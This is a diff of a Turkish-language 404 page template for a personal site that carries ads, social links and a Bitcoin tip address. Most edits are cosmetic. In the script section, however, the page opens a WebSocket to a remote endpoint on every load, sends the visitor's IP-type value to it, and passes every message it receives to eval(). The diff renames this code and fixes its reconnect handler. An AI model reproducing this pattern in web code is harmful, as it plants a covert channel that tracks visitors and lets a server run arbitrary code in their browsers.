@@ -116,7 +116,7 @@
 	    
 <h1>Bu sayfa bulunamadı.</h1>
 <p><i>Geri dönmeyi düşünün <a href="/" title="Ana sayfa">ana sayfa</a>.</i></p>
-<img class="mx-auto" style="width: 80%; height: auto" src="https://i.imgur.com/OJSRIU3.jpeg" alt="Kapak fotoğrafım">
+<img class="mx-auto" style="width: 100%; max-width: 800px; height: auto" src="https://i.imgur.com/OJSRIU3.jpeg" alt="Kapak fotoğrafım">
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -136,7 +136,7 @@
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -173,12 +173,16 @@
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Bu adresi kullanarak bana Bitcoin ile ilgili bir ipucu bırakın:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Adresi kopyala" onclick="copyToClipboard('btc-wallet');">Kopyala</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Beni Instagram&#x27;da ziyaret et" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Beni Twitter&#x27;da ziyaret et" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Beni YouTube&#x27;da izle" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=tr" title="Hizmet şartlarını görün">Hizmet Şartları</a></span></p>
 		    </div>
@@ -197,7 +201,7 @@ function getLang() {
     return navigator.languages[0]; 
   return navigator.language;
 }
-var allowedLangs = ['en','de','fr','es','pt','ar','da','nl','th','id','ru','ja','th','af','hi','zh-CN','tl','cs','he','it','no','pl','sv','tr','uk','vi','zu','sq',];
+var allowedLangs = ['en','de','fr','es','pt','ar','da','nl','id','ru','ja','th','af','hi','zh-CN','tl','cs','he','it','no','pl','sv','tr','uk','vi','zu','sq',];
 var theLang = getLang();
 if(theLang == 'en-US'){ theLang = 'en'; }
 if(allowedLangs.includes(theLang) && theLang != 'tr' && !window.location.pathname.startsWith('/' + thelang + '/')) {
@@ -215,32 +219,32 @@ if(allowedLangs.includes(theLang) && theLang != 'tr' && !window.location.pathnam
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -387,18 +391,39 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Bu sayfayı QR kodunu tarayarak paylaşın.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
     
